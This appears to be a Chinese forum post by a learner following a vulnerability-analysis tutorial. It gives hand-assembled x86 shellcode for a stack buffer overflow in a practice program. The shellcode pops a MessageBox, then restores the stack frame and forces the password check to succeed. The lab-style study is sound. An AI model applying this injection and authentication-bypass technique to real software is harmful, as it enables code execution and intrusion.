
# 学习<软件漏洞分析入门教学系列-5>

> 原文：[`www.pediy.com/kssd/pediy11/118901.html`](https://www.pediy.com/kssd/pediy11/118901.html)

最近学习 failwest 的软件漏洞分析入门教学系列，也没权限跟帖，所以发这来了
大家也可以去看看，学习学习，挺有意思的
http://bbs.pediy.com/showthread.php?t=56445

原帖讲得很明白，我也给出自己的成果，包括帖中提出的安全退出部分。
改了一下原帖汇编码，以适应我的机子，当然要显示我自己的 id `"xiaca"`

机器代码（16 进制）   汇编指令               注释
```
BB 61616161           MOV EBX,0x61616161    其实就为了最后的'a'
C1EB 18               SHR EBX,0x18          完成串尾"a\\0"
53                    PUSH EBX              存入栈
68 78696163           PUSH 0x63616978       存入栈"xiac";
8BC4                  MOV EAX,ESP           eax 里是字符串"xiaca"指针
33DB                  XOR EBX,EBX           ebx 清 0
53                    PUSH EBX              四个参数按照从右向左的顺序入栈，分别为:
                                              (0,"xiaca","xiaca",0)
                                              消息框为默认风格，文本区和标题都是"xiaca"
50                    PUSH EAX
50                    PUSH EAX
53                    PUSH EBX
B8 EA07D577           MOV EAX,0x77D507EA    装载 MessageBoxA 入口地址,要改为自己机器上的函数入口地址
FFD0                  CALL EAX              调用 MessageBoxA
.......                                  填充 0x90 -- nop 指令
7C FB 13 00                              最后是返回指令地址；根据自己程序情况修改，
```
我用 `od` 跟踪，取的是 `char password[1024];` 的地址，原文取的是 `char buffer[44];` 的地址，
我认为不安全，因为函数执行完后，`buffer` 空间是被忽略的，执行这些附加代码后，
栈的使用将有覆盖附加代码的危险；如果 `password` 是堆里动态分配的话就不行了，那么使用 `buffer` 地址的话，
应该在使用栈前进行栈帧分配才行，当然用完后恢复栈平衡

## 安全退出

有人直接调用 `exit` 退出，我觉得不好，我想跳到函数返回继续运行
那么安全上讲应在跳转前恢复到原来正确栈帧，
栈帧的 `ebp` 被覆盖，无法定位，我是直接指定的，
跳转代码的地址也没法自动定位，也是直接指定，
这两个值根据自己情况在 `od` 中获取，
`esp` 可以根据栈平衡来恢复
所以我的退出代码如下
```
83C4 08         ADD ESP,8           MessageBoxA 调用会自动平衡掉 4 个参数，所以只需
                                    平衡掉字符串"xiaca"的两次 push 即可
BD FF80FF13     MOV EBP,0x13FF80FF  回复 EBP 到 0x0013ff80，为了指令中没有 00，加点处理
C1ED 08         SHR EBP,8
33C0            XOR EAX,EAX         改变函数 verify_password 返回，使成功
BB FF181140     MOV EBX,0x401118FF  回复 EBP 到 0x00401118，为了指令中没有 00，同上处理
C1EB 08         SHR EBX,8
FFE3            JMP EBX             跳转执行
```

最终文件

![](img/82c119fb40c873deaa3a0a536c5aa19d.jpg)

运行结果

![](img/93baa5460e7f9a071401af6e4a9f88b7.jpg)

确定后

![](img/d6f06c00196ea2d7e2f4be23d4475cd0.jpg)
